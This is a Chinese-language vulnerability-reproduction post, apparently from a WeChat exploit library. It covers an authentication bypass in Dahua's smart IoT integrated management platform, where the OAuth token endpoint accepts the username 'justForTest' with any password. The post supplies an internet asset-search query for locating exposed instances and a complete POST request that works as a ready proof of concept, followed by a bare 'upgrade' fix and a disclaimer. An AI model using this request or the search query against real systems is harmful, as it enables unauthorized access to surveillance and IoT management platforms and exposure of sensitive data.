#  大华智能物联综合管理平台justForTest用户登录漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-02-02 02:30  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
  
大华智能物联综合管理平台  
justForTest  
用户登录漏洞  
  
  
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJgMpbzd3SqSEXngibfBqtGgC1MlVxlUnFtBe1fDlibmW04BAYRkEswI43Ewz54uHFXtpDBv5IuKjUA/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJUynlQicnGrKU287bby4waMy2VibolRibAAibVia7ibqb56z6UibiaOvfWZLIPQGMMdibNtsnicYNQ8iaIsoicEg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
03  
  
—  
  
漏洞简介  
  
大华智能物  
联综  
合管理平台  
是大  
华股份推出的一套集成化、智能化的综合管理软件，旨在为各类场景提供  
高效、灵活的物联管理解决方  
案  
。  
大华智能物联综合管理平台  
以模块化设计为核心，结合大华在安防领域的技术优势，为企业提供一站式智能物联管理服务，助力提升运营效率与安全性  
。  
大  
华智能物联综合管理平台  
的用户登录接口/evo-apigw/evo-oauth/oauth/token  
存在漏洞，攻击者可使用用户名justForTest  
搭配任意密码登录系统，绕过身份验证，导致敏感信息泄露。  
  
  
04  
  
—  
  
资产测绘  
```
body="static/qwebchannel.js" && body="/客户端会小于800/"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJgMpbzd3SqSEXngibfBqtGgzT5WCoJ8UIiaicJGtJQ1CicOShpJPuj4MPQuXSYz1xzw0M6DgVCAjleKQ/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```
POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Content-Length: 109
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJgMpbzd3SqSEXngibfBqtGgItY7GGE9gDj3nKzZAlkGibH7PuT9N3dDscJddz1of0OicGbHiaic39WZaQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJgMpbzd3SqSEXngibfBqtGgC1MlVxlUnFtBe1fDlibmW04BAYRkEswI43Ewz54uHFXtpDBv5IuKjUA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJgMpbzd3SqSEXngibfBqtGgq6LgvmRibZGaqEVKQuo83tjLLibWWcrMdoYf46PlRgf9cXBXZRjmGGRA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJgMpbzd3SqSEXngibfBqtGgrFfEMJUEXeJQjWNjhZOUtBqEz84kDDuBSCqY7Hnm5bUWp1JqoVZzZg/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
  
升级系统以修复漏洞  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
  
  
  
